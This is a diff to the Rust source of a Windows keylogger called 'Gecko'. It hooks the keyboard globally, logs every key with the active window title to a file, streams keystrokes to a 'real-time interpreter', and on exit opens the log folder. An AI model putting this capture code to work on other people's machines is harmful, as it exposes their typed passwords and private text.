@@ -1,10 +1,12 @@
-use std::{collections::HashMap, sync::{Arc, Mutex}, time::{Duration, Instant}, thread, sync::mpsc, fs::File, io::Write};
+use std::{collections::HashMap, fs::File, io::Write, process, sync::{mpsc, Arc, Mutex}, thread, time::{Duration, Instant}, path::PathBuf};
 use willhook::{keyboard_hook, InputEvent, KeyboardKey};
 use winapi::um::winuser::{GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, VK_CONTROL, VK_SHIFT};
 use winapi::um::winuser::GetAsyncKeyState;
+use crate::components::{self, filecreator::retrieve_directory};
 
 pub fn activate_keylogger(file: Arc<Mutex<File>>) {
-    let (sender, receiver) = mpsc::channel();
+    // Create a channel for keylogger termination
+    let (keylogger_sender, keylogger_receiver) = mpsc::channel();
     let held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>> = Arc::new(Mutex::new(HashMap::new()));
     let held_keys_clone = Arc::clone(&held_keys);
     let h = keyboard_hook().unwrap();
@@ -14,36 +16,92 @@ pub fn activate_keylogger(file: Arc<Mutex<File>>) {
     writeln!(file_guard, "Gecko activated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
     drop(file_guard);
     let fileex = Arc::clone(&file);
+
+    // Get Keyboard Event Sender channel and Shutdown Sender channel for real-time interpreter
+    let (keysender, gsd_rti) = components::rtinterpreter::start_rtinterpreter();
     // Keyboard Event Handling thread
     let keyboard_handle = thread::spawn(move || {
-        keyboard_event_handler(h, held_keys_clone, receiver, fileex);
+        keyboard_event_handler(keysender, h, held_keys_clone, keylogger_receiver, fileex);
     });
-
+    
     loop {
-        if exit_condition() {
-            println!("Gecko deactivating....");
+        if exit_condition() {        
+            // Retrieve the directory path
+            let dir = match retrieve_directory() {
+                Ok(dir) => dir,
+                Err(err) => {
+                    eprintln!("Error retrieving directory path: {}", err);
+                    break;
+                }
+            };
+        
+            // Write deactivation timestamp to the log file
             let mut file_guard = file.lock().unwrap();
             writeln!(file_guard, "Gecko deactivated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
             drop(file_guard);
-            if let Err(err) = sender.send(()) {
-                eprintln!("Failed to send termination signal: {}", err);
+        
+            // Send termination signal to the keylogger thread
+            if let Err(err) = keylogger_sender.send(()).map_err(|e| format!("Failed to send termination signal to keylogger thread: {}", e)) {
+                eprintln!("{}", err);
             }
+
+            // Send termination signal to the real-time interpreter thread
+            if let Err(err) = gsd_rti.send(true).map_err(|e| format!("Failed to send termination signal to real-time interpreter thread: {}", e)) {
+                eprintln!("{}", err);
+            }
+            std::thread::sleep(Duration::from_millis(100));
+            println!("Gecko deactivating....");
+
+            // Open the directory
+            if let Err(err) = open_directory(&dir) {
+                eprintln!("Error opening directory: {}", err);
+            }
+        
             break;
         }
-
+        
         std::thread::sleep(Duration::from_millis(10)); // Adjust sleep duration dynamically based on CPU usage
     }
 
     keyboard_handle.join().unwrap();
+
+    process::exit(0);
 }
-fn keyboard_event_handler(h: willhook::Hook, held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>>, receiver: mpsc::Receiver<()>, file: Arc<Mutex<File>>) {
+
+fn open_directory(directory_path: &PathBuf) -> std::io::Result<()> {
+    // Convert PathBuf to &str
+    let directory_path_str = directory_path.to_str().ok_or_else(|| {
+        std::io::Error::new(std::io::ErrorKind::Other, "Failed to convert directory path to string")
+    })?;
+
+    // Rest of your code remains the same
+    match std::env::consts::OS {
+        "windows" => {
+            std::process::Command::new("explorer")
+                .arg(directory_path_str)
+                .spawn()?;
+        }
+        "macos" => {
+            std::process::Command::new("open")
+                .arg("-R")
+                .arg(directory_path_str)
+                .spawn()?;
+        }
+        _ => {
+            eprintln!("Unsupported OS for opening directory");
+        }
+    }
+    Ok(())
+}
+
+fn keyboard_event_handler(keysender: mpsc::Sender<KeyboardKey>, h: willhook::Hook, held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>>, receiver: mpsc::Receiver<()>, file: Arc<Mutex<File>>) {
     let mut last_title = String::new();
     loop {
         if let Ok(ie) = h.try_recv() {
             match ie {
                 InputEvent::Keyboard(ke) => {
                     if let Some(key) = ke.key {
-                        handle_key_event(key, ke.pressed, &mut held_keys.lock().unwrap(), &mut last_title, &file);
+                        handle_key_event(&keysender, key, ke.pressed, &mut held_keys.lock().unwrap(), &mut last_title, &file);
                     }
                 }
                 _ => {
@@ -62,6 +120,7 @@ fn keyboard_event_handler(h: willhook::Hook, held_keys: Arc<Mutex<HashMap<Keyboa
 }
 
 fn handle_key_event(
+    keysender: &mpsc::Sender<KeyboardKey>,
     key: KeyboardKey,
     pressed: willhook::KeyPress,
     held_keys: &mut HashMap<KeyboardKey, Instant>,
@@ -77,12 +136,14 @@ fn handle_key_event(
         }
         willhook::KeyPress::Up(_) => {
             if let Some(inittime) = held_keys.remove(&key) {
-                let elapsed = Instant::now().duration_since(inittime);
-                if elapsed.as_millis() < 400 {
-                    log_key(&file, &last_title, key, None);
-                } else {
-                    log_key(&file, &last_title, key, Some(elapsed));
-                }
+                    let elapsed = Instant::now().duration_since(inittime);
+                    if elapsed.as_millis() < 400 {
+                        keysender.send(key).unwrap();
+                        log_key(&file, &last_title, key, None);
+                    } else {
+                        keysender.send(key).unwrap();
+                        log_key(&file, &last_title, key, Some(elapsed));
+                    }
             }
         }
         _ => {}
